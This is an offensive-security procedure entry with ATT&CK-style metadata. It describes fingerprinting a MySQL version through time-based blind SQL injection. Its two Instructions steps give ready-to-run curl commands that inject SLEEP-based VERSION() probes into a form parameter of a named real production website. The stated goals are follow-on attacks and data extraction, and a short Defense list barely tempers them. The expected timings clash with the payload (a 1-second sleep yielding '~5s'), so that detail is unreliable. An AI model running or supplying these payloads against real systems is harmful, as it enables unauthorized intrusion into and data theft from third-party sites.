---
id: proc-uuid-003
tags:
  - dbms-fingerprinting
  - version-detection
type: procedure
tools:
  - '[[tools/curl]]'
  - '[[tools/time]]'
tactics:
  - '[[Discovery]]'
  - '[[Collection]]'
commands:
  - '[[commands/fingerprint-mysql-version-5]]'
  - '[[commands/fingerprint-mysql-version-4]]'
verified: false
platforms:
  - Web
  - MySQL
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[System Information Discovery]]'
updated_at: '2025-12-14T03:46:26.258Z'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Discovery]]'
  - '[[Collection]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[System Information Discovery]]'
---
# Fingerprint-DBMS-Version-via-Time-based-SQLi

## Summary

This procedure uses time-based blind SQLi to fingerprint the DBMS version by conditionally delaying responses based on the VERSION() function output.

## Description

By injecting payloads like IF(MID(VERSION(),1,1)='5',SLEEP(1),0), attackers infer version details through timing without direct output. On this target, it confirms MySQL 5, aiding in tailored exploitation or further data leaks via binary search on database contents.

## Requirements

1. Verified SQLi from prior steps
2. curl and time for timing measurements
3. Understanding of MySQL functions like MID and VERSION

## Defense

Defensive measures and detection strategies:

- Restrict VERSION() access or mask outputs
- Implement rate limiting on suspicious timed requests
- Use intrusion detection for SQL function usage in payloads

## Objectives

1. Determine DBMS type and version
2. Enable targeted follow-on attacks
3. Assess backend for further vulnerabilities

## Instructions

### Step 1: Check for Version Starting with '5'

**Context**: Probe first character of VERSION() to detect MySQL 5.

**Command** ([[commands/fingerprint-mysql-version-5]]):
```bash
time curl --data "ACT=55&jsontree={\"x\":1}&site_id=1&group_id=1'-IF(MID(VERSION(),1,1)='5',SLEEP(1),0) AND group_id='1" https://news.starbucks.com
```

> Delay confirms '5'. Expected: ~5s response.

### Step 2: Contrast with Version '4'

**Context**: Test alternative to rule out other versions.

**Command** ([[commands/fingerprint-mysql-version-4]]):
```bash
time curl --data "ACT=55&jsontree={\"x\":1}&site_id=1&group_id=1'-IF(MID(VERSION(),1,1)='4',SLEEP(1),0) AND group_id='1" https://news.starbucks.com
```

> No delay rules out '4'. Expected: ~1s.

## MITRE ATT&CK Mapping

### Tactics

- [[Discovery]]
- [[Collection]]

### Techniques

- [[Exploit Public-Facing Application]]
- [[System Information Discovery]]

### Sub-Techniques


## Commands Used

- [[commands/fingerprint-mysql-version-5]]
- [[commands/fingerprint-mysql-version-4]]

## Tools Used

- [[tools/curl]]
- [[tools/time]]

## Tags

- [[dbms-fingerprinting]]
- [[version-detection]]
